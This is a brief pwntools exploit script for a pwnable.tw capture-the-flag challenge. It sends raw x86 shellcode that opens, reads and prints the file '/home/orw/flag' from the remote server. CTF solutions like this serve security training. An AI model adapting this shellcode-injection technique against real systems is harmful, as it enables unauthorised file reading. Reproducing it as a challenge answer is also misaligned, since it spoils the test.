from pwn import *
p=remote('chall.pwnable.tw', 10001)
sc='31c050686167000068772f666c68652f6f72682f686f6d89c189e3b805000000cd8089c389e1ba40000000b803000000cd8089c2bb01000000b804000000cd80'
p.sendafter(":",bytes.fromhex(sc))
p.interactive()
